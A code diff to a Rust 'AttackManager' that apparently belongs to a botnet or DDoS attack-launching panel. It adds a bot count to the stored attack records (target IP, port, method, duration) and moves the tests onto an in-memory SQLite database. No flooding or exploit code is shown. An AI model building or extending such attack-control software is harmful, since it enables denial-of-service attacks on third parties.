@@ -153,7 +153,7 @@ impl AttackManager {
         let ip_str = ip.to_string();
         let now = chrono::Utc::now();
 
-        let id = sqlx::query("INSERT INTO attacks (username, target_ip, target_port, method, duration, started_at, status) VALUES (?, ?, ?, ?, ?, ?, ?)")
+        let id = sqlx::query("INSERT INTO attacks (username, target_ip, target_port, method, duration, started_at, status, bot_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
             .bind(&username)
             .bind(&ip_str)
             .bind(port)
@@ -161,6 +161,7 @@ impl AttackManager {
             .bind(duration_secs as i64)
             .bind(now)
             .bind("running")
+            .bind(bot_count as i64)
             .execute(&self.pool)
             .await
             .map_err(|e| format!("Database error: {}", e))?
@@ -338,10 +339,41 @@ impl AttackManager {
 mod tests {
     use super::*;
     use std::net::Ipv4Addr;
+    use sqlx::sqlite::SqlitePoolOptions;
+
+    async fn setup_test_db() -> SqlitePool {
+        let pool = SqlitePoolOptions::new()
+            .connect("sqlite::memory:")
+            .await
+            .expect("Failed to create test database");
+
+        sqlx::query(
+            r#"
+            CREATE TABLE attacks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                method TEXT NOT NULL,
+                target_ip TEXT NOT NULL,
+                target_port INTEGER NOT NULL,
+                duration INTEGER NOT NULL,
+                username TEXT NOT NULL,
+                started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                finished_at DATETIME,
+                status TEXT DEFAULT 'running',
+                bot_count INTEGER DEFAULT 0
+            );
+            "#
+        )
+        .execute(&pool)
+        .await
+        .expect("Failed to create schema");
+
+        pool
+    }
 
     #[tokio::test]
     async fn test_attack_manager_lifecycle() {
-        let manager = AttackManager::new(10, 60, 300);
+        let pool = setup_test_db().await;
+        let manager = AttackManager::new(10, 60, 300, pool);
         let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
         
         // Start attack
@@ -382,7 +414,8 @@ mod tests {
 
     #[tokio::test]
     async fn test_attack_limits() {
-        let manager = AttackManager::new(2, 60, 300);
+        let pool = setup_test_db().await;
+        let manager = AttackManager::new(2, 60, 300, pool);
         let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
         
         // Fill capacity
@@ -396,7 +429,8 @@ mod tests {
 
     #[tokio::test]
     async fn test_invalid_method() {
-        let manager = AttackManager::new(10, 60, 300);
+        let pool = setup_test_db().await;
+        let manager = AttackManager::new(10, 60, 300, pool);
         let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
         
         let result = manager.start_attack(
@@ -413,7 +447,8 @@ mod tests {
 
     #[tokio::test]
     async fn test_attack_duration_limit() {
-        let manager = AttackManager::new(10, 60, 100); // Max duration 100s
+        let pool = setup_test_db().await;
+        let manager = AttackManager::new(10, 60, 100, pool); // Max duration 100s
         let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
         
         // Try to start attack with duration > max
